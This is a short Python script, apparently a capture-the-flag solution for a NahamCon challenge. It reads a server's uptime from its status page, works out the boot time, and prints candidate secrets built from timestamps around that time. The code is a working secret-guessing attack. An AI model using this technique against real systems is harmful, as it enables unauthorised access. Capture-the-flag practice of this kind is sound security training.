import requests, subprocess, re
from datetime import datetime, timedelta

BASE = 'http://challenge.nahamcon.com:31103/'

# calc uptime
r = requests.get(BASE + "status").text
#print(r)
match = re.search(r"(\d+)\s+days?\s+(\d+)\s+hours?\s+(\d+)\s+minutes?", r)
days = int(match.group(1))
hours = int(match.group(2))
minutes = int(match.group(3))
uptime = datetime.now() - timedelta(days=days, hours=hours, minutes=minutes)
#print(uptime)

for d in range(-1000,1000):
    cand = uptime + timedelta(minutes=d)
    print('THE_REYNOLDS_PAMPHLET-' + cand.strftime("%Y%m%d%H%M"))